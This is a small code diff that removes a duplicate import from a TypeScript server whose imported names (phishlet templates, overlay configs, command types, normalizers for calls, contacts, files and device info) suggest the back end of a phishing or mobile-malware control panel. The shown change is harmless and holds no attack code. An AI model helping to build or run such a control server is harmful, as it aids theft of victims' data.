@@ -9,7 +9,6 @@ import { clients, overlayConfigs, phishletData, phishletTemplates } from '../db/
 import { eq, and, sql, lt } from 'drizzle-orm';
 import { getConfig } from '../config/index.js';
 import { CMD, CMD_TO_DATA_TYPE, type CmdType } from '../types/index.js';
-import { overlayConfigs, phishletData, phishletTemplates } from '../db/schema.js';
 import { getMimeType, normalizePermissions, normalizeDeviceInfo, normalizeCalls, normalizeContacts, normalizeFileList } from '../utils/helpers.js';
 import { log } from '../utils/logger.js';
 import { verifySessionToken } from '../middleware/auth.js';
